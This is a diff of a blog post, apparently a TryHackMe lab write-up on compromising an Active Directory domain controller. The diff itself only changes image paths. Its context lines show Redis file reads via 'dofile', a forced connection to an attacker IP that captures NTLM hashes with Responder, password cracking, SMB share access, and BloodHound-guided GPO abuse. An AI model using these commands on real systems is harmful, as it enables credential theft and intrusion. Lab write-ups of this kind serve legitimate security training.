@@ -62,13 +62,13 @@ A Golden Ticket attack is a type of attack in which an attacker gains access to 
 
 This room on tryhackme is all about active directory and domain controller. So let's begin our machine with Nmap scanning.
 
-![Initial Enumeration](/placeholder.svg?height=400&width=800&text=Initial+Enumeration+Screenshot)
+![Initial Enumeration](/images/enum.jpg)
 
 Every domain controller services are up and running which is part of AD DC. But \`Kerberos\` is not running so we can not [AS-REP](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/) roasting the usernames to check if they are valid.
 
 I ran the Nmap to scan all ports.
 
-![All Ports Scan](/blog-images/vulnet-nmap-all.jpg)
+![All Ports Scan](/images/nmap_all.jpg)
 
 Here many ports are open so it is always beneficial to check for all ports. RPC and LDAP services are also running, Smb is a very good option to start with and I did the same.
 
@@ -82,12 +82,12 @@ It confirms that no guest and a null session are allowed.
 But my eyes got on to port 6379 (Redis). I was unaware of this but [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) are always a good option to search for anything.
 Redis is a No-sql database that stores information alongside key-value called keyspaces. The version of Redis key-value store 2.8.2402 is vulnerable to ssrf + CRLF.
 
-![Redis Exploitation](/blog-images/vulnet-redis.jpg)
+![Redis Exploitation](/images/redis.jpg)
 
 Here we can exploit Redis via ssrf, but we must know the path to the windows server files
 \`redis-cli -h 10.10.245.19 eval "dofile('C:\\\\\\Users\\\\\\enterprise-security\\\\\\Desktop\\\\\\users.txt')" 0\`
 
-![Redis Command Execution](/blog-images/vulnet-redis-exp.jpg)
+![Redis Command Execution](/images/redis_exp.jpg)
 
 we got the users.txt flag. If we can get any files why not exploit further to get Authenticated user's NTLM hash? If we forge redis to connect back to our attacking machine, maybe users' hashes will be exposed.
 
@@ -97,7 +97,7 @@ I set up the responder from impacket, when users from the Redis server try to co
 
 \`redis-cli -h 10.10.245.19 eval "dofile('//10.9.0.31/test')" 0\`
 
-![Responder Hash Capture](/blog-images/vulnet-responder.jpg)
+![Responder Hash Capture](/images/responder.jpg)
 
 Since we got the user enterprise-security hash, we cracked with john the ripper and got the password.
 
@@ -107,11 +107,11 @@ We have now a username and password, so we can enumerate allowed shares on smbse
 
 \`smbmap -H 10.10.155.156 -u enterprise-security -p pass\`
 
-![SMB Enumeration](/placeholder.svg?height=400&width=800&text=SMB+Share+Enumeration)
+![SMB Enumeration](/images/smbmap.jpg)
 
 \`smbclient //10.10.155.156/enterprise-share -U 'enterprise-security' pass\`
 
-![SMB Client Access](/placeholder.svg?height=400&width=800&text=SMB+Client+Access)
+![SMB Client Access](/images/smbclient.jpg)
 
 There is a Powershell script scheduled to run, PurgeIrrelevantData_1826.ps1 with content.
 \`rm -Force C:\\Users\\Public\\Documents\\* -ErrorAction SilentlyContinue\`
@@ -138,7 +138,7 @@ When I get the foothold on the machine, I always start with winPEAS.exe and it d
 
 I collect domain info with bloodhound-python and upload it to the bloodhound for analyzing users, groups, and domains.
 
-![BloodHound Analysis](/placeholder.svg?height=400&width=800&text=BloodHound+Domain+Analysis)
+![BloodHound Analysis](/images/bloodhound.jpg)
 
 Here is the shortest path to the admin where we will be abusing one of the \`GPO(group policy object)\` on which we can edit users' permission, local groups, memberships, and computer tasks.
 
